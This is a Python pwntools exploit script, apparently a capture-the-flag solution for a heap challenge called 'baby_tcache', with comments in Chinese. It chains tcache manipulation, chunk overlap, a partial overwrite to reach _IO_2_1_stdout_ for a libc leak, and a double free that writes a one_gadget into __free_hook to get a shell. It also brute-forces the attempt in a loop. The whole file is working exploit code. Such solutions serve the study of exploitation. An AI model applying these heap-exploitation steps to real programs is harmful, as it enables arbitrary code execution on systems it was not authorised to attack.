# coding=utf-8
from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p=process('./baby_tcache')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, content):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Data:')
    p.send(content)

def dele(index):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))

def add_7_times(size):
    for _ in range(7):
        add(size, 'xxxx')

def del_7_times(begin, end):
    for i in range(begin, end):
        dele(i)

def main():
    add_7_times(0x80)
    del_7_times(0, 7)
    add_7_times(0x120)
    del_7_times(0, 7)
    
    add_7_times(0x200)
    add(0x208, 'A') #7
    add(0x200, 'B') #8
    add(0x200, 'C') #9
    del_7_times(0, 7)

    dele(8) 
    dele(7) #remain 9

    add(0x108, 'A'*0x108) #remain 0 9 || 创建了一个last_remainder

    add_7_times(0x80)
    add(0x80, 'b1') #remain 0 (1-7) 8 9
    del_7_times(1, 8)
   
    add(0x210, 'b2') #add 1 || remain 0 1 8 9 || 将被overlap的chunk
   
    dele(8)
    dele(9) #overlap

    dele(1) #b2进入tcache || remain 0
    
    add_7_times(0x80)
    add(0x80, 'b1') #add 8
    del_7_times(1, 8) #remain 0 8
    #此时topchunk与b2重叠

    add_7_times(0x120)
    add(0x120, 'xxxx') #add 9 || 在b2处创建一个smallchunk
    del_7_times(1, 8) #remain 0 8 9
    add(0x1000, 'xxxx') #add 1 || 防止topchunk合并
    dele(9) #remain 0 1 8 || 将smallchunk又释放掉，获得一个指向libc的fd指针
   
    add(0x50, '\x60\xa7') #add 2 || 再在b2处分配一个chunk，并partial overwrite改写fd指针，这个因为_IO_2_1_stdout_的低3个16进制位为760，所以需要爆破。
    add(0x210, 'xxxx') #add 3 || 从tcache中又将b2分配出来，_IO_2_1_stdout_的地址位于tcache中
    payload = p64(0xfbad1800)+p64(0)*3+"\x08"
    add(0x210, payload) #add 4 || remain 0 1 2 3 4 8 || 在_IO_2_1_stdout_处分配chunk，然后修改其中的变量值
    
    #泄漏libc
    libc_base = u64(p.recvline()[:8]) - 0x3ED8B0
    print "libc_base : %#x" % libc_base
    free_hook = libc_base + libc.symbols['__free_hook']
    one_gadget = libc_base + 0x4f322

    #3和2都是b2,double free
    dele(3)
    dele(2)
    add(0x50, p64(free_hook)) #修改fd为free_hook
    add(0x50, 'xxxx') 
    add(0x50, p64(one_gadget)) #将free_hook修改为onegadget
    dele(0)
    
if __name__ == '__main__':
    while(True):
        try:
            main()
          #  gdb.attach(p)
            p.interactive()
            p.close()
            break
        except:
            p.close()
            p = process('./baby_tcache')

